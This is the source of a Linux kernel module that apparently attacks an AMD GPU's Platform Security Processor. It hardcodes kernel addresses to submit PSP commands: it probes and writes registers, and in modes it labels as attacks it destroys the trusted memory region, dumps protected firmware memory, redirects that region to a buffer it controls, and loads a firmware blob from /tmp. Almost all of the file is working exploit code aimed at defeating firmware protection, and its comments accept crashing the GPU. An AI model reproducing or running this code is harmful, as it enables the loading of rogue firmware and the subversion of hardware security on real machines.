#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/io.h>
MODULE_LICENSE("GPL");
static int mode = 1;
module_param(mode, int, 0644);

struct psp_cmd {
    u32 buf_size, buf_version, cmd_id;
    u32 resp_lo, resp_hi, resp_off, resp_size;
    u32 data[32];
    u32 resp[16];
};
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);

static int __init pa_init(void) {
    struct pci_dev *p = pci_get_device(0x1002, 0x1586, NULL);
    void *adev, *psp;
    psp_fn submit;
    struct psp_cmd *cmd;
    u64 fence_mc;
    int ret;

    if (!p) return -ENODEV;
    adev = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)adev + 0x3B910;
    fence_mc = *(u64*)((u8*)psp + 0x1B8);
    submit = (psp_fn)0xFFFFFFFFC0F2F840ULL;
    cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
    if (!cmd) { pci_dev_put(p); return -ENOMEM; }

    pr_info("pa: mode=%d\n", mode);

    if (mode == 1) {
        /* PROG_REG — probe all known reg IDs */
        /* Known: PSP_REG_IH_RB_CNTL=0, IH_RB_CNTL_RING1=1, IH_RB_CNTL_RING2=2 */
        /* Try 0-15 and some high values */
        int reg_ids[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15,
                         0x100, 0x200, 0x581a, 0x581b, /* UCODE_ADDR/DATA */
                         0x2816, /* IC_BASE_CNTL */
                         0xFFFF};
        int i;
        for (i = 0; i < 18; i++) {
            memset(cmd, 0, sizeof(*cmd));
            cmd->buf_size = sizeof(*cmd);
            cmd->buf_version = 1;
            cmd->cmd_id = 0x0B; /* PROG_REG */
            cmd->data[0] = 0x00000000; /* reg_value = 0 (safe read-like) */
            cmd->data[1] = reg_ids[i]; /* reg_id */

            ret = submit(psp, NULL, cmd, fence_mc);
            pr_info("pa: PROG_REG id=0x%04X val=0: ret=%d resp=0x%X\n",
                reg_ids[i], ret, cmd->resp[0]);
        }

        /* Try writing a known value to reg_id 0 (IH_RB_CNTL) */
        memset(cmd, 0, sizeof(*cmd));
        cmd->buf_size = sizeof(*cmd); cmd->buf_version = 1;
        cmd->cmd_id = 0x0B;
        cmd->data[0] = 0xCAFEBABE;
        cmd->data[1] = 0; /* IH_RB_CNTL */
        ret = submit(psp, NULL, cmd, fence_mc);
        pr_info("pa: PROG_REG id=0 val=0xCAFEBABE: ret=%d resp=0x%X\n",
            ret, cmd->resp[0]);
    }

    if (mode == 2) {
        /* DESTROY_TMR — WARNING: may crash GPU!
         * But since we're on SSH, display crash is acceptable.
         * After destroy, check if TMR physical memory becomes readable. */
        u64 tmr_bo_phys = 0x2060000000ULL; /* from Phase 24 */
        void __iomem *tmr_map;

        pr_info("pa: === DESTROY_TMR ATTACK ===\n");

        /* Pre-map TMR BO physical address */
        tmr_map = ioremap_wc(tmr_bo_phys, 0x1000);
        if (!tmr_map) {
            pr_info("pa: TMR ioremap failed\n");
            goto done;
        }

        /* Read TMR before destroy */
        {
            u32 v = readl(tmr_map);
            pr_info("pa: TMR before DESTROY: 0x%08X%s\n",
                v, v == 0xFFFFFFFF ? " (PROTECTED)" : " (READABLE!)");
        }

        /* Submit DESTROY_TMR */
        memset(cmd, 0, sizeof(*cmd));
        cmd->buf_size = sizeof(*cmd);
        cmd->buf_version = 1;
        cmd->cmd_id = 0x07; /* DESTROY_TMR */

        pr_info("pa: Submitting DESTROY_TMR...\n");
        ret = submit(psp, NULL, cmd, fence_mc);
        pr_info("pa: DESTROY ret=%d resp=0x%X\n", ret, cmd->resp[0]);

        /* Immediately read TMR! */
        udelay(1000);
        {
            u32 v = readl(tmr_map);
            pr_info("pa: TMR after DESTROY: 0x%08X%s\n",
                v, v == 0xFFFFFFFF ? " (STILL PROTECTED)" :
                " *** PROTECTION DROPPED! ***");

            if (v != 0xFFFFFFFF) {
                /* SCAN FOR FIRMWARE! */
                int i;
                pr_info("pa: *** TMR IS NOW ACCESSIBLE! ***\n");
                for (i = 0; i < 64; i++) {
                    u32 w = readl(tmr_map + i * 4);
                    if (i % 8 == 0)
                        pr_info("pa: [%03X]:", i * 4);
                    pr_cont(" %08X", w);
                    if (i % 8 == 7)
                        pr_cont("\n");
                }
            }
        }

        /* Try to re-setup TMR with our own buffer pointing to
         * writable VRAM that we control */
        if (ret == 0) {
            u64 fw_pri_mc = *(u64*)((u8*)psp + 0x050);
            pr_info("pa: Attempting SETUP_TMR with fw_pri buffer...\n");

            memset(cmd, 0, sizeof(*cmd));
            cmd->buf_size = sizeof(*cmd);
            cmd->buf_version = 1;
            cmd->cmd_id = 0x05; /* SETUP_TMR */
            cmd->data[0] = lower_32_bits(fw_pri_mc); /* buf addr lo */
            cmd->data[1] = upper_32_bits(fw_pri_mc); /* buf addr hi */
            cmd->data[2] = 0x100000; /* 1MB size */
            cmd->data[3] = 0; /* no flags */

            ret = submit(psp, NULL, cmd, fence_mc);
            pr_info("pa: SETUP_TMR ret=%d resp=0x%X\n", ret, cmd->resp[0]);
        }

        iounmap(tmr_map);
    }

    if (mode == 3) {
        /* LOAD_IP_FW — try to reload MEC firmware from fw_pri buffer
         * This is the command PSP uses to load firmware to TMR.
         * If we put our own firmware in fw_pri first... */
        u64 fw_pri_mc = *(u64*)((u8*)psp + 0x050);
        void *fw_pri_buf = (void*)*(u64*)((u8*)psp + 0x058);

        pr_info("pa: === LOAD_IP_FW ATTACK ===\n");
        pr_info("pa: fw_pri_mc=0x%llX fw_pri_buf=%px\n", fw_pri_mc, fw_pri_buf);

        /* Copy the real MEC firmware blob to fw_pri buffer */
        {
            /* Read from /tmp/gc_12_0_1_mec.bin */
            struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
            if (!IS_ERR(fp)) {
                loff_t pos = 0;
                ssize_t n = kernel_read(fp, fw_pri_buf, 0x6E000, &pos);
                pr_info("pa: Read %zd bytes of MEC firmware to fw_pri\n", n);
                filp_close(fp, NULL);

                if (n > 0) {
                    /* Verify copy */
                    u32 v;
                    copy_from_kernel_nofault(&v, fw_pri_buf, 4);
                    pr_info("pa: fw_pri[0] = 0x%08X\n", v);

                    /* Submit LOAD_IP_FW for CP_MEC */
                    memset(cmd, 0, sizeof(*cmd));
                    cmd->buf_size = sizeof(*cmd);
                    cmd->buf_version = 1;
                    cmd->cmd_id = 0x06; /* LOAD_IP_FW */
                    cmd->data[0] = lower_32_bits(fw_pri_mc);
                    cmd->data[1] = upper_32_bits(fw_pri_mc);
                    cmd->data[2] = n; /* size */
                    cmd->data[3] = 4; /* GFX_FW_TYPE_CP_MEC */

                    pr_info("pa: Submitting LOAD_IP_FW (MEC)...\n");
                    ret = submit(psp, NULL, cmd, fence_mc);
                    pr_info("pa: ret=%d resp=0x%X\n", ret, cmd->resp[0]);

                    /* If PSP accepted it, the firmware is reloaded! */
                    if (ret == 0 && cmd->resp[0] == 0) {
                        pr_info("pa: *** LOAD_IP_FW SUCCEEDED! ***\n");
                        pr_info("pa: MEC firmware may have been reloaded!\n");
                    }
                }
            } else {
                pr_info("pa: Cannot open MEC firmware file\n");
            }
        }
    }

done:
    kfree(cmd);
    pci_dev_put(p);
    return 0;
}
static void __exit pa_exit(void) { pr_info("pa: unloaded\n"); }
module_init(pa_init); module_exit(pa_exit);
